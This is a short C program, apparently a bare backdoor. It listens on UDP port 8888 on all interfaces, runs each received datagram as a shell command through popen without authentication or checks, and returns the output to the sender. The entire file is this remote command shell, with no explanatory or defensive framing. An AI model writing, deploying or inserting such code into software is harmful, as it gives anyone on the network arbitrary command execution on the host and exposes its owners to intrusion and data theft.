#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 8888
#define BUFFER_SIZE 1024

int main() {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];

    // Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Error in socket creation");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind the socket to the server address
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error in binding");
        exit(1);
    }

    printf("Server is listening on port %d...\n", PORT);

    while (1) {
        // Receive a command from the client
        memset(buffer, 0, sizeof(buffer));
        recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&client_addr, &client_addr_len);
        printf("Received command: %s\n", buffer);

        // Execute the command and capture the output
        FILE* cmd_output = popen(buffer, "r");
        if (cmd_output == NULL) {
            perror("Error executing command");
            continue;
        }

        // Send the output back to the client
        memset(buffer, 0, sizeof(buffer));
        while (fgets(buffer, sizeof(buffer), cmd_output) != NULL) {
            sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr*)&client_addr, client_addr_len);
            memset(buffer, 0, sizeof(buffer));
        }

        // Close the command output
        pclose(cmd_output);
    }

    close(sockfd);
    return 0;
}
